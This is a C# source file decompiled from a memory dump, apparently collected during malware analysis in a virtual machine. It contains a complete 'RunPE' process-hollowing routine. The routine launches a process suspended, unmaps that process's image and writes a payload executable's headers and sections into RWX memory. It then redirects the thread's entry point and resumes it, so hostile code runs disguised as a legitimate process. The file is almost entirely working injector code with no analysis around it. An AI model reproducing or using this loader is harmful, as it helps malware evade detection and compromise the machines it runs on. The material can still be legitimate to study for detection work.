// Decompiled with JetBrains decompiler
// Type: g.RunPE
// Assembly: es, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4F5E42DF-7B78-45EB-8AAA-54929E9E72A7
// Assembly location: C:\Users\gorno\Desktop\vm\Dumps\UnknownName\vdump_000B0000.exe

using Microsoft.VisualBasic.CompilerServices;
using System;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Security;

namespace g
{
  internal class RunPE
  {
    [SuppressUnmanagedCodeSecurity]
    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    private static extern bool CreateProcess(string applicationName, string commandLine, IntPtr processAttributes, IntPtr threadAttributes, bool inheritHandles, uint creationFlags, IntPtr environment, string currentDirectory, ref RunPE.STARTUP_INFORMATION startupInfo, ref RunPE.PROCESS_INFORMATION processInformation);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("kernel32.dll")]
    private static extern bool GetThreadContext(IntPtr thread, int[] context);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("kernel32.dll")]
    private static extern bool Wow64GetThreadContext(IntPtr thread, int[] context);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("kernel32.dll")]
    private static extern bool SetThreadContext(IntPtr thread, int[] context);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("kernel32.dll")]
    private static extern bool Wow64SetThreadContext(IntPtr thread, int[] context);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("kernel32.dll")]
    private static extern bool ReadProcessMemory(IntPtr process, int baseAddress, ref int buffer, int bufferSize, ref int bytesRead);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("kernel32.dll")]
    private static extern bool WriteProcessMemory(IntPtr process, int baseAddress, byte[] buffer, int bufferSize, ref int bytesWritten);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("ntdll.dll")]
    private static extern int NtUnmapViewOfSection(IntPtr process, int baseAddress);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("kernel32.dll")]
    private static extern int VirtualAllocEx(IntPtr handle, int address, int length, int type, int protect);

    [SuppressUnmanagedCodeSecurity]
    [DllImport("kernel32.dll")]
    private static extern int ResumeThread(IntPtr handle);

    public static bool Run(string path, string cmd, byte[] data, bool compatible)
    {
      int num = 1;
      while (!RunPE.HandleRun(path, cmd, data, compatible))
      {
        checked { ++num; }
        if (num > 5)
          return false;
      }
      return true;
    }

    private static bool HandleRun(string path, string cmd, byte[] data, bool compatible)
    {
      string commandLine = string.Format("\"{0}\"", (object) path);
      RunPE.STARTUP_INFORMATION startupInfo = new RunPE.STARTUP_INFORMATION();
      RunPE.PROCESS_INFORMATION processInformation = new RunPE.PROCESS_INFORMATION();
      startupInfo.Size = checked ((uint) Marshal.SizeOf(typeof (RunPE.STARTUP_INFORMATION)));
      bool flag1;
      try
      {
        if (!string.IsNullOrEmpty(cmd))
          commandLine = commandLine + " " + cmd;
        if (!RunPE.CreateProcess(path, commandLine, IntPtr.Zero, IntPtr.Zero, false, 4U, IntPtr.Zero, (string) null, ref startupInfo, ref processInformation))
          throw new Exception();
        int int32_1 = BitConverter.ToInt32(data, 60);
        int int32_2 = BitConverter.ToInt32(data, checked (int32_1 + 52));
        int[] context = new int[179];
        context[0] = 65538;
        if (IntPtr.Size == 4)
        {
          if (!RunPE.GetThreadContext(processInformation.ThreadHandle, context))
            throw new Exception();
        }
        else if (!RunPE.Wow64GetThreadContext(processInformation.ThreadHandle, context))
          throw new Exception();
        int num1 = context[41];
        int buffer1;
        int num2;
        if (!RunPE.ReadProcessMemory(processInformation.ProcessHandle, checked (num1 + 8), ref buffer1, 4, ref num2))
          throw new Exception();
        if (int32_2 == buffer1 && (uint) RunPE.NtUnmapViewOfSection(processInformation.ProcessHandle, buffer1) > 0U)
          throw new Exception();
        int int32_3 = BitConverter.ToInt32(data, checked (int32_1 + 80));
        int int32_4 = BitConverter.ToInt32(data, checked (int32_1 + 84));
        int baseAddress = RunPE.VirtualAllocEx(processInformation.ProcessHandle, int32_2, int32_3, 12288, 64);
        bool flag2;
        if (!compatible && baseAddress == 0)
        {
          flag2 = true;
          baseAddress = RunPE.VirtualAllocEx(processInformation.ProcessHandle, 0, int32_3, 12288, 64);
        }
        if (baseAddress == 0)
          throw new Exception();
        if (!RunPE.WriteProcessMemory(processInformation.ProcessHandle, baseAddress, data, int32_4, ref num2))
          throw new Exception();
        int num3 = checked (int32_1 + 248);
        int num4 = checked ((int) BitConverter.ToInt16(data, int32_1 + 6) - 1);
        int num5 = 0;
        while (num5 <= num4)
        {
          int int32_5 = BitConverter.ToInt32(data, checked (num3 + 12));
          int int32_6 = BitConverter.ToInt32(data, checked (num3 + 16));
          int int32_7 = BitConverter.ToInt32(data, checked (num3 + 20));
          if ((uint) int32_6 > 0U)
          {
            byte[] buffer2 = new byte[checked (int32_6 - 1 + 1)];
            Buffer.BlockCopy((Array) data, int32_7, (Array) buffer2, 0, buffer2.Length);
            if (!RunPE.WriteProcessMemory(processInformation.ProcessHandle, checked (baseAddress + int32_5), buffer2, buffer2.Length, ref num2))
              throw new Exception();
          }
          checked { num3 += 40; }
          checked { ++num5; }
        }
        byte[] bytes = BitConverter.GetBytes(baseAddress);
        if (!RunPE.WriteProcessMemory(processInformation.ProcessHandle, checked (num1 + 8), bytes, 4, ref num2))
          throw new Exception();
        int int32_8 = BitConverter.ToInt32(data, checked (int32_1 + 40));
        if (flag2)
          baseAddress = int32_2;
        context[44] = checked (baseAddress + int32_8);
        if (IntPtr.Size == 4)
        {
          if (!RunPE.SetThreadContext(processInformation.ThreadHandle, context))
            throw new Exception();
        }
        else if (!RunPE.Wow64SetThreadContext(processInformation.ThreadHandle, context))
          throw new Exception();
        if (RunPE.ResumeThread(processInformation.ThreadHandle) == -1)
          throw new Exception();
      }
      catch (Exception ex)
      {
        ProjectData.SetProjectError(ex);
        Process processById = Process.GetProcessById(checked ((int) processInformation.ProcessId));
        if (processById != null)
          processById.Kill();
        flag1 = false;
        ProjectData.ClearProjectError();
        goto label_41;
      }
      flag1 = true;
label_41:
      return flag1;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct PROCESS_INFORMATION
    {
      public IntPtr ProcessHandle;
      public IntPtr ThreadHandle;
      public uint ProcessId;
      public uint ThreadId;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    private struct STARTUP_INFORMATION
    {
      public uint Size;
      public string Reserved1;
      public string Desktop;
      public string Title;
      [MarshalAs(UnmanagedType.ByValArray, SizeConst = 36)]
      public byte[] Misc;
      public IntPtr Reserved2;
      public IntPtr StdInput;
      public IntPtr StdOutput;
      public IntPtr StdError;
    }
  }
}
